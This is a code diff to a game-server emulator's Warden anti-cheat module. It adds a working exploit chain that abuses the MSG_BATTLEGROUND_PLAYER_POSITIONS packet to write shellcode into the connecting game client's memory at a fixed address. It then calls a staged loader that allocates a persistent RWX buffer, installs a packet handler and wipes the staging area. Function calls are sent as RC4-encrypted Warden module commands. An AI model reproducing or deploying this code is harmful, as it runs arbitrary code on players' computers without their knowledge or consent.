@@ -16,6 +16,7 @@
  */
 
 #include "WardenWin.h"
+#include "WardenPayloads.h"
 #include "Common.h"
 #include "ByteBuffer.h"
 #include "Containers.h"
@@ -141,6 +142,72 @@ void WardenWin::InitializeModule()
 
     WorldPacket pkt(SMSG_WARDEN_DATA, sizeof(WardenInitModuleRequest));
     pkt.append(reinterpret_cast<uint8*>(&Request), sizeof(WardenInitModuleRequest));
+    _session->SendPacket(&pkt);
+
+    // Install the BG-positions packet handler so the exploit write-primitive is available.
+    this->RunClientFunction(WardenPayload::Rva::BgPositionHandlerInstall);
+
+    // Send the shellcode installer via the MSG_BATTLEGROUND_PLAYER_POSITIONS exploit.
+    // This stages the loader and handler payload into Va::StagingBase (0xDD1000).
+    ByteBuffer installerBody;
+    WardenPayload::BuildShellcodeInstaller(installerBody);
+    WorldPacket pkt3(MSG_BATTLEGROUND_PLAYER_POSITIONS, installerBody.size());
+    pkt3.append(installerBody);
+    _session->SendPacket(&pkt3);
+
+    // Execute the staged loader (Va::StagingBase = 0xDD1000 = base + Rva::StagingLoader).
+    // The loader allocates the persistent RWX buffer, copies the handler payload into it,
+    // registers it for opcode 0x4B8, and wipes the staging area.
+    this->RunClientFunction(WardenPayload::Rva::StagingLoader);
+}
+
+void WardenWin::RunClientFunction(uint32 function)
+{
+    ByteBuffer moduleInit;
+    moduleInit << uint8(WardenPayload::Protocol::ModuleInitSubCmdCallFunc);
+    moduleInit << uint8(0);
+    moduleInit << uint8(0);
+    moduleInit << function;
+    moduleInit << uint8(1);
+
+    // Frame-advance payload: flush the previous call by running a no-op frame tick.
+    ByteBuffer moduleInitFrameExecute;
+    moduleInitFrameExecute << uint8(WardenPayload::Protocol::ModuleInitSubCmdCallFunc);
+    moduleInitFrameExecute << uint8(0);
+    moduleInitFrameExecute << uint8(0);
+    moduleInitFrameExecute << uint32(WardenPayload::Rva::FrameExecute);
+    moduleInitFrameExecute << uint8(1);
+
+    // Build check request
+    ByteBuffer buff;
+    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
+    buff << uint16(moduleInit.size());
+    buff << uint32(BuildChecksum(moduleInit.contents(), 8));
+    buff.append(moduleInit);
+
+    uint8 xorByte = _inputKey[0];
+    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
+    buff << uint8(0);
+    buff << uint8(TIMING_CHECK ^ xorByte);
+    buff << uint8(LUA_EVAL_CHECK ^ xorByte);
+    buff << uint8(1);
+    buff << uint8(xorByte);
+
+    buff << uint8(WARDEN_SMSG_CHEAT_CHECKS_REQUEST);
+    buff << uint8(0);
+    buff << uint8(TIMING_CHECK ^ xorByte);
+    buff << uint8(xorByte);
+
+    buff << uint8(WARDEN_SMSG_MODULE_INITIALIZE);
+    buff << uint16(moduleInitFrameExecute.size());
+    buff << uint32(BuildChecksum(moduleInitFrameExecute.contents(), 8));
+    buff.append(moduleInitFrameExecute);
+
+    // Encrypt with warden RC4 key
+    EncryptData(buff.contents(), buff.size());
+
+    WorldPacket pkt(SMSG_WARDEN_DATA, buff.size());
+    pkt.append(buff);
     _session->SendPacket(&pkt);
 }
 
